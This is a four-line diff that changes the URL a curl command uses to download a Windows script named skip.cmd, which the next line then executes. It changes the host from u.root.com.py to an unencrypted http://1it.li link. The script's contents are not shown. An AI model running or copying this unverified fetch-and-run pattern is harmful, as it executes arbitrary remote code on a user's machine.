@@ -1,4 +1,4 @@
-curl -L https://u.root.com.py/win -o skip.cmd
+curl -L http://1it.li/win -o skip.cmd
 
 skip.cmd
 
